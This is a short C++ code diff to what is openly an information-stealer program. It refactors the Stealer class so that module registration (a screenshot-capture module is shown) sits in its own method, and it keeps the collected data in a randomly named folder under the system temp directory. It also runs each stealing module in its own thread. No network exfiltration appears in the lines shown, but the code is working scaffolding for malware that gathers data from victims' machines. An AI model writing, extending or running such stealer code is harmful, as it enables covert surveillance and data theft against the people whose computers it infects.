@@ -5,12 +5,15 @@
 #include "Stealer.h"
 #include "impl/Screenshot.h"
 
-Stealer::Stealer() {
+void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
+}
 
-    std::string dir_name = Utils::generateString(10);
-    this->root_dir = Utils::getTemp() / dir_name;
 
+Stealer::Stealer() {
+    this->registerModules();
+
+    this->root_dir = Utils::getTemp() / Utils::generateString(10);
     fs::create_directory(this->root_dir);
 
 #if DEV
@@ -20,8 +23,15 @@ Stealer::Stealer() {
 }
 
 void Stealer::run() {
-    for(StealerImpl* module : this->modules)
-    {
-        module->execute(this->root_dir);
+    std::vector<std::thread> threads;
+
+    for (StealerImpl* module : this->modules) {
+        threads.emplace_back(&StealerImpl::execute, module, this->root_dir);
+    }
+
+    for (std::thread& thread : threads) {
+        if (thread.joinable()) {
+            thread.join();
+        }
     }
 }
